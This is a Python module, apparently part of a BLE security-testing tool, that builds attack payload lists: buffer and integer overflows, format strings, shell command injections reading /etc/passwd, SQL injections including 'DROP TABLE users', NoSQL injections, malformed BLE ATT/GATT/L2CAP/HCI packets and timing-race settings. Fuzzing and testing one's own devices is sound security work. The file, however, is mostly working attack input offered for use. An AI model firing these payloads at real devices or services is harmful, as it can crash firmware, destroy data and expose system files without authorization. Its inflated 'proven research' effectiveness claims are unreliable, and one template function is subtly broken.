
# security/payloads.py - Advanced Payload Library
import struct
import random
import string
import itertools
from typing import List, Dict, Any, Optional, Generator, Tuple
from enum import Enum
from dataclasses import dataclass
from utils.logging import get_logger

logger = get_logger(__name__)

class PayloadCategory(Enum):
    """Payload categories for organization"""
    PROVEN_RESEARCH = "proven_research"
    BUFFER_OVERFLOW = "buffer_overflow"
    INTEGER_OVERFLOW = "integer_overflow"
    FORMAT_STRING = "format_string"
    COMMAND_INJECTION = "command_injection"
    SQL_INJECTION = "sql_injection"
    PROTOCOL_VIOLATION = "protocol_violation"
    TIMING_ATTACK = "timing_attack"
    MEMORY_CORRUPTION = "memory_corruption"
    FUZZING_GENERIC = "fuzzing_generic"

class PayloadComplexity(Enum):
    """Payload complexity levels"""
    BASIC = "basic"
    INTERMEDIATE = "intermediate"
    ADVANCED = "advanced"
    EXPERT = "expert"

@dataclass
class PayloadInfo:
    """Metadata about a payload"""
    category: PayloadCategory
    complexity: PayloadComplexity
    description: str
    target_platforms: List[str]
    effectiveness_rating: int  # 1-10 scale
    risk_level: str  # "low", "medium", "high", "critical"
    references: List[str] = None

class PayloadLibrary:
    """Comprehensive payload library for BLE security testing"""
    
    def __init__(self):
        self.logger = get_logger(f"{__name__}.PayloadLibrary")
        self._initialize_payload_database()
    
    def _initialize_payload_database(self):
        """Initialize the payload database with metadata"""
        self.payload_database = {
            # Proven research payloads
            b'\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE': PayloadInfo(
                category=PayloadCategory.PROVEN_RESEARCH,
                complexity=PayloadComplexity.EXPERT,
                description="Proven vulnerability pattern for memory corruption testing",
                target_platforms=["ESP32", "ARM Cortex-M", "nRF52"],
                effectiveness_rating=10,
                risk_level="critical",
                references=["BlueForge Research 2024"]
            ),
            
            b'\x41\x41\x41\x41\x41\x41\x41\x41': PayloadInfo(
                category=PayloadCategory.BUFFER_OVERFLOW,
                complexity=PayloadComplexity.BASIC,
                description="Classic buffer overflow pattern",
                target_platforms=["All"],
                effectiveness_rating=8,
                risk_level="high"
            ),
            
            b'\x00\x80\x04\x40\x00\x00\x00\x00': PayloadInfo(
                category=PayloadCategory.MEMORY_CORRUPTION,
                complexity=PayloadComplexity.ADVANCED,
                description="IRAM base address targeting (ESP32)",
                target_platforms=["ESP32"],
                effectiveness_rating=9,
                risk_level="critical"
            ),
        }
    
    def get_proven_research_payloads(self) -> List[Tuple[bytes, PayloadInfo]]:
        """Get proven research payloads with highest success rates"""
        payloads = [
            # Core proven patterns
            (b'\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE', "Proven vulnerability trigger"),
            (b'\x41\x41\x41\x41\x41\x41\x41\x41', "Buffer overflow classic"),
            (b'\x00\x80\x04\x40\x00\x00\x00\x00', "ESP32 IRAM base"),
            (b'\x00\x00\x04\x40\x00\x00\x00\x00', "ESP32 ROM base"),
            (b'\x00\x00\x0D\x40\x00\x00\x00\x00', "ESP32 Flash base"),
            
            # Memory layout targeting
            (b'\x00\x10\x00\x20\x00\x00\x00\x00', "ARM Cortex-M stack pointer"),
            (b'\x00\x00\x00\x08\x00\x00\x00\x00', "ARM vector table"),
            (b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF', "Memory boundary test"),
            
            # Function pointer corruption
            (b'\x90\x90\x90\x90\x90\x90\x90\x90', "NOP sled pattern"),
            (b'\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC', "Debug breakpoint pattern"),
            
            # Advanced memory corruption
            (struct.pack('<Q', 0xDEADBEEFCAFEBABE), "64-bit pattern"),
            (struct.pack('<I', 0x41414141) * 2, "Repeated 32-bit overflow"),
        ]
        
        result = []
        for payload, desc in payloads:
            info = self.payload_database.get(payload, PayloadInfo(
                category=PayloadCategory.PROVEN_RESEARCH,
                complexity=PayloadComplexity.ADVANCED,
                description=desc,
                target_platforms=["Multiple"],
                effectiveness_rating=8,
                risk_level="high"
            ))
            result.append((payload, info))
        
        return result
    
    def get_buffer_overflow_payloads(self, max_size: int = 1024) -> List[bytes]:
        """Generate buffer overflow payloads of various sizes"""
        payloads = []
        
        # Classic patterns
        patterns = [
            b'A',      # Basic ASCII
            b'\x41',   # Hex equivalent
            b'\x00',   # Null bytes
            b'\xFF',   # Max bytes
            b'\x90',   # NOP instruction
            b'\xCC',   # Debug break
            b'%',      # Format string trigger
            b'\x42',   # Different pattern
        ]
        
        # Boundary sizes that often trigger vulnerabilities
        boundary_sizes = [
            8, 16, 20, 24, 32, 48, 64, 80, 96, 128, 
            144, 160, 192, 224, 256, 288, 320, 384, 
            448, 512, 576, 640, 768, 896, 1024
        ]
        
        for size in boundary_sizes:
            if size > max_size:
                break
            
            for pattern in patterns:
                payloads.append(pattern * size)
        
        # Gradual size increase around critical boundaries
        critical_boundaries = [16, 32, 64, 128, 256, 512]
        for boundary in critical_boundaries:
            if boundary > max_size:
                continue
            
            # Test sizes around boundary
            for offset in range(-4, 8):
                test_size = boundary + offset
                if 0 < test_size <= max_size:
                    payloads.append(b'A' * test_size)
        
        return payloads
    
    def get_integer_overflow_payloads(self) -> List[bytes]:
        """Generate integer overflow payloads for different bit widths"""
        payloads = []
        
        # 8-bit boundaries
        int8_values = [0x7F, 0x80, 0xFF, 0x100]
        for value in int8_values:
            clamped = value & 0xFF
            payloads.extend([
                struct.pack('<B', clamped),
                struct.pack('>B', clamped),
            ])
        
        # 16-bit boundaries
        int16_values = [0x7FFF, 0x8000, 0xFFFF, 0x10000]
        for value in int16_values:
            clamped = value & 0xFFFF
            payloads.extend([
                struct.pack('<H', clamped),
                struct.pack('>H', clamped),
            ])
        
        # 32-bit boundaries
        int32_values = [0x7FFFFFFF, 0x80000000, 0xFFFFFFFF, 0x100000000]
        for value in int32_values:
            clamped = value & 0xFFFFFFFF
            payloads.extend([
                struct.pack('<I', clamped),
                struct.pack('>I', clamped),
                struct.pack('<L', clamped),
                struct.pack('>L', clamped),
            ])
        
        # 64-bit boundaries
        int64_values = [
            0x7FFFFFFFFFFFFFFF,
            0x8000000000000000,
            0xFFFFFFFFFFFFFFFF
        ]
        for value in int64_values:
            payloads.extend([
                struct.pack('<Q', value),
                struct.pack('>Q', value),
            ])
        
        # Mixed-endian confusion
        test_value = 0x12345678
        payloads.extend([
            struct.pack('<I', test_value),
            struct.pack('>I', test_value),
            struct.pack('<HH', test_value & 0xFFFF, (test_value >> 16) & 0xFFFF),
            struct.pack('>HH', (test_value >> 16) & 0xFFFF, test_value & 0xFFFF),
        ])
        
        return payloads
    
    def get_format_string_payloads(self) -> List[bytes]:
        """Generate format string attack payloads"""
        payloads = []
        
        # Basic format string attacks
        basic_formats = [
            b'%x', b'%s', b'%d', b'%u', b'%p', b'%n',
            b'%08x', b'%016x', b'%32x',
            b'%hn', b'%hhn', b'%lln',
        ]
        
        for fmt in basic_formats:
            payloads.extend([
                fmt,
                fmt * 2,
                fmt * 4,
                fmt * 8,
            ])
        
        # Chained format strings
        chains = [
            b'%x%x%x%x',
            b'%s%s%s%s',
            b'%p%p%p%p',
            b'%n%n%n%n',
            b'%x%x%x%x%x%x%x%x',
            b'%08x' * 16,
        ]
        payloads.extend(chains)
        
        # Format string with length specifiers
        length_attacks = [
            b'%999999999x',
            b'%999999999s',
            b'%999999999d',
            b'%.999999999x',
            b'%*.999999999x',
        ]
        payloads.extend(length_attacks)
        
        # Advanced format string techniques
        advanced = [
            b'%7$x',      # Direct parameter access
            b'%7$n',      # Direct write
            b'%7$hn',     # Short write
            b'%7$hhn',    # Byte write
            b'AAAA%7$x',  # With padding
            b'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x',  # Stack walking
        ]
        payloads.extend(advanced)
        
        return payloads
    
    def get_command_injection_payloads(self) -> List[bytes]:
        """Generate command injection payloads"""
        payloads = []
        
        # Basic command separators
        separators = [b';', b'|', b'&', b'||', b'&&', b'\n', b'\r\n']
        commands = [
            b'id', b'whoami', b'pwd', b'ls', b'cat /etc/passwd',
            b'uname -a', b'ps aux', b'netstat -an', b'ifconfig'
        ]
        
        for sep in separators:
            for cmd in commands:
                payloads.append(sep + cmd)
        
        # Backtick execution
        for cmd in commands[:4]:  # Keep it simple
            payloads.append(b'`' + cmd + b'`')
            payloads.append(b'$(' + cmd + b')')
        
        # Embedded commands
        embedded_patterns = [
            b'normal_input;id',
            b'normal_input|whoami',
            b'normal_input&&pwd',
            b'normal_input||ls',
            b'normal_input`id`',
            b'normal_input$(whoami)',
        ]
        payloads.extend(embedded_patterns)
        
        # Shell metacharacters
        metachar_tests = [
            b'test;id#',
            b'test|id#',
            b'test&id#',
            b'test\nid',
            b'test\r\nid',
            b'test\x00id',
        ]
        payloads.extend(metachar_tests)
        
        return payloads
    
    def get_sql_injection_payloads(self) -> List[bytes]:
        """Generate SQL injection payloads"""
        payloads = []
        
        # Basic SQL injection
        basic_sqli = [
            b"'",
            b'"',
            b"' OR '1'='1",
            b'" OR "1"="1',
            b"' OR 1=1--",
            b'" OR 1=1--',
            b"'; DROP TABLE users;--",
            b'"; DROP TABLE users;--',
            b"' UNION SELECT NULL--",
            b'" UNION SELECT NULL--',
        ]
        payloads.extend(basic_sqli)
        
        # Blind SQL injection
        blind_sqli = [
            b"' AND SLEEP(5)--",
            b'" AND SLEEP(5)--',
            b"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            b"' OR IF(1=1,SLEEP(5),0)--",
            b"' AND IF(1=1,SLEEP(5),0)--",
        ]
        payloads.extend(blind_sqli)
        
        # Time-based SQL injection
        time_based = [
            b"'; WAITFOR DELAY '00:00:05'--",
            b'"; WAITFOR DELAY \'00:00:05\'--',
            b"' AND (SELECT SLEEP(5))--",
            b'" AND (SELECT SLEEP(5))--',
        ]
        payloads.extend(time_based)
        
        # NoSQL injection
        nosql_injection = [
            b'{"$ne": null}',
            b'{"$gt": ""}',
            b'{"$regex": ".*"}',
            b'{"$where": "this.username == this.password"}',
            b'"; return true; var dummy="',
        ]
        payloads.extend(nosql_injection)
        
        return payloads
    
    def get_protocol_violation_payloads(self) -> List[bytes]:
        """Generate BLE protocol violation payloads"""
        payloads = []
        
        # ATT protocol violations
        att_violations = [
            b'\xFF' + b'\x00' * 7,                      # Invalid ATT opcode
            b'\x00' + b'\xFF' * 7,                      # Invalid parameters
            b'\x16\x00\x00\x00\x00' + b'\x41' * 100,   # Oversized Prepare Write
            b'\x08\x00\x00\xFF\xFF\x00\x00',           # Invalid handle range
            b'\x12\x00\x00\x00\x00\x00\x00',           # Execute Write Request
            b'\x1E' + b'\x00' * 19,                     # Invalid signed write
        ]
        payloads.extend(att_violations)
        
        # GATT violations
        gatt_violations = [
            b'\x02\x00\x00\x00',                        # Disconnect during operation
            b'\x03\x00\x00\x00',                        # Data while disconnected
            b'\x04' + b'\xFF' * 15,                     # Invalid service discovery
            b'\x06\x00\x00\x00\x00' + b'\xFF' * 11,    # Invalid read request
            b'\x52\x00\x00\x00\x00' + b'\xFF' * 11,    # Invalid write request
        ]
        payloads.extend(gatt_violations)
        
        # L2CAP violations
        l2cap_violations = [
            b'\x01\x04\x00\x00',                        # Security req during pairing
            b'\x01\x05\x00\x00',                        # Pairing req while paired
            b'\x02\x06\x00\x00',                        # Invalid pairing response
            b'\x03\x07\x00\x00',                        # Pairing confirm error
            b'\x04\x08\x00\x00',                        # Invalid random
        ]
        payloads.extend(l2cap_violations)
        
        # HCI command violations
        hci_violations = [
            b'\x01\x03\x0C\x00',                        # Reset command
            b'\x01\x05\x0C\x03\x00\x00\x00',          # Set event filter
            b'\x01\x13\x0C\x00',                        # Read local name
            b'\x01\x14\x0C' + b'\x00' * 248,           # Oversized name
        ]
        payloads.extend(hci_violations)
        
        return payloads
    
    def get_timing_attack_payloads(self) -> List[Dict[str, Any]]:
        """Generate timing attack payload configurations"""
        timing_configs = []
        
        # Base payloads for timing attacks
        base_payloads = [
            b'\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE',
            b'\x41\x41\x41\x41\x41\x41\x41\x41',
            b'\x00\x80\x04\x40\x00\x00\x00\x00',
            b'\x42' * 8,
        ]
        
        # Proven timing configurations
        proven_timings = [
            (24, 14),   # Proven research timing
            (50, 10),   # Aggressive timing
            (100, 5),   # Very aggressive
            (10, 20),   # Slow but steady
            (5, 50),    # Very slow
        ]
        
        for payload in base_payloads:
            for iterations, delay_ms in proven_timings:
                timing_configs.append({
                    'payload': payload,
                    'iterations': iterations,
                    'delay_ms': delay_ms,
                    'description': f'{iterations} iterations @ {delay_ms}ms',
                    'risk_level': 'critical' if (iterations, delay_ms) == (24, 14) else 'high'
                })
        
        # Race condition configurations
        race_conditions = [
            {'payload': b'\x42' * 8, 'iterations': 20, 'delay_ms': 1, 'description': 'Fast race condition'},
            {'payload': b'\x43' * 8, 'iterations': 50, 'delay_ms': 0.5, 'description': 'Very fast race'},
            {'payload': b'\x44' * 8, 'iterations': 100, 'delay_ms': 0.1, 'description': 'Extreme race'},
        ]
        timing_configs.extend(race_conditions)
        
        return timing_configs
    
    def get_memory_corruption_payloads(self) -> List[bytes]:
        """Generate memory corruption payloads"""
        payloads = []
        
        # Heap corruption patterns
        heap_patterns = [
            b'\x41' * 16 + b'\x42' * 8,                 # Overflow into next chunk
            b'\x00' * 8 + b'\xFF' * 8,                  # Null then max
            b'\x90' * 32,                               # NOP sled
            struct.pack('<Q', 0x4141414141414141),      # Repeated pattern
        ]
        payloads.extend(heap_patterns)
        
        # Stack corruption patterns
        stack_patterns = []
        for size in [64, 128, 256, 512]:
            # Classic stack smashing
            stack_patterns.append(b'A' * size)
            # Return address overwrite simulation
            stack_patterns.append(b'A' * (size - 8) + struct.pack('<Q', 0x4141414141414141))
            # Saved frame pointer overwrite
            stack_patterns.append(b'A' * (size - 16) + struct.pack('<QQ', 0x4242424242424242, 0x4141414141414141))
        payloads.extend(stack_patterns)
        
        # Use-after-free simulation
        uaf_patterns = [
            b'\xDE\xAD\xBE\xEF' * 4,                   # Freed memory pattern
            b'\xFE\xED\xFA\xCE' * 4,                   # Another freed pattern
            b'\x00' * 16,                               # Zeroed freed memory
        ]
        payloads.extend(uaf_patterns)
        
        # Double-free simulation
        double_free = [
            b'\xFF' * 16 + b'\x00' * 16,               # Free then access
            b'\xCC' * 32,                               # Debug pattern
        ]
        payloads.extend(double_free)
        
        return payloads
    
    def get_fuzzing_payloads(self, count: int = 100, 
                           min_size: int = 1, max_size: int = 512) -> List[bytes]:
        """Generate random fuzzing payloads"""
        payloads = []
        
        for _ in range(count):
            size = random.randint(min_size, max_size)
            
            # Choose generation method
            method = random.choice(['random', 'ascii', 'binary', 'mixed', 'pattern'])
            
            if method == 'random':
                payload = bytes([random.randint(0, 255) for _ in range(size)])
            elif method == 'ascii':
                payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=size)).encode()
            elif method == 'binary':
                payload = bytes([random.choice([0x00, 0xFF, 0x41, 0x42, 0x90, 0xCC]) for _ in range(size)])
            elif method == 'mixed':
                # Mix of printable and non-printable
                chars = []
                for _ in range(size):
                    if random.random() < 0.7:  # 70% printable
                        chars.append(random.randint(32, 126))
                    else:  # 30% non-printable
                        chars.append(random.randint(0, 31))
                payload = bytes(chars)
            else:  # pattern
                pattern = bytes([random.randint(0, 255) for _ in range(min(8, size))])
                payload = pattern * (size // len(pattern)) + pattern[:size % len(pattern)]
            
            payloads.append(payload)
        
        return payloads
    
    def get_payloads_by_category(self, category: PayloadCategory, 
                                max_count: Optional[int] = None) -> List[bytes]:
        """Get payloads filtered by category"""
        category_methods = {
            PayloadCategory.PROVEN_RESEARCH: lambda: [p[0] for p in self.get_proven_research_payloads()],
            PayloadCategory.BUFFER_OVERFLOW: self.get_buffer_overflow_payloads,
            PayloadCategory.INTEGER_OVERFLOW: self.get_integer_overflow_payloads,
            PayloadCategory.FORMAT_STRING: self.get_format_string_payloads,
            PayloadCategory.COMMAND_INJECTION: self.get_command_injection_payloads,
            PayloadCategory.SQL_INJECTION: self.get_sql_injection_payloads,
            PayloadCategory.PROTOCOL_VIOLATION: self.get_protocol_violation_payloads,
            PayloadCategory.MEMORY_CORRUPTION: self.get_memory_corruption_payloads,
            PayloadCategory.FUZZING_GENERIC: lambda: self.get_fuzzing_payloads(100),
        }
        
        if category not in category_methods:
            self.logger.warning(f"Unknown payload category: {category}")
            return []
        
        payloads = category_methods[category]()
        
        if max_count and len(payloads) > max_count:
            # Prioritize by effectiveness if we have metadata
            if category == PayloadCategory.PROVEN_RESEARCH:
                # Keep proven payloads as-is, they're already prioritized
                payloads = payloads[:max_count]
            else:
                # For other categories, take a random sample
                payloads = random.sample(payloads, max_count)
        
        return payloads
    
    def get_payload_info(self, payload: bytes) -> Optional[PayloadInfo]:
        """Get metadata for a specific payload"""
        return self.payload_database.get(payload)
    
    def generate_custom_payload(self, template: str, **kwargs) -> bytes:
        """Generate custom payload from template"""
        templates = {
            'overflow': lambda size: b'A' * kwargs.get('size', 64),
            'pattern': lambda: kwargs.get('pattern', b'\x42') * kwargs.get('repeat', 8),
            'format': lambda: kwargs.get('format', b'%x') * kwargs.get('count', 4),
            'address': lambda: struct.pack('<Q', kwargs.get('address', 0x4141414141414141)),
            'mixed': lambda: self._generate_mixed_payload(**kwargs),
        }
        
        if template not in templates:
            raise ValueError(f"Unknown template: {template}")
        
        return templates[template]()
    
    def _generate_mixed_payload(self, **kwargs) -> bytes:
        """Generate mixed payload with various patterns"""
        size = kwargs.get('size', 32)
        components = kwargs.get('components', ['ascii', 'binary', 'null'])
        
        payload = b''
        remaining = size
        
        for component in components:
            if remaining <= 0:
                break
            
            chunk_size = min(remaining, size // len(components))
            
            if component == 'ascii':
                chunk = b'A' * chunk_size
            elif component == 'binary':
                chunk = bytes([0xFF] * chunk_size)
            elif component == 'null':
                chunk = b'\x00' * chunk_size
            elif component == 'pattern':
                pattern = kwargs.get('pattern', b'\x42')
                chunk = pattern * (chunk_size // len(pattern)) + pattern[:chunk_size % len(pattern)]
            else:
                chunk = bytes([random.randint(0, 255) for _ in range(chunk_size)])
            
            payload += chunk
            remaining -= chunk_size
        
        return payload


# Factory functions for easy usage
def get_proven_payloads() -> List[bytes]:
    """Get proven research payloads quickly"""
    lib = PayloadLibrary()
    return [p[0] for p in lib.get_proven_research_payloads()]

def get_timing_payloads() -> List[Dict[str, Any]]:
    """Get timing attack configurations quickly"""
    lib = PayloadLibrary()
    return lib.get_timing_attack_payloads()

def get_category_payloads(category: str, max_count: int = 50) -> List[bytes]:
    """Get payloads by category name"""
    try:
        cat_enum = PayloadCategory(category)
        lib = PayloadLibrary()
        return lib.get_payloads_by_category(cat_enum, max_count)
    except ValueError:
        logger.error(f"Invalid category: {category}")
        return []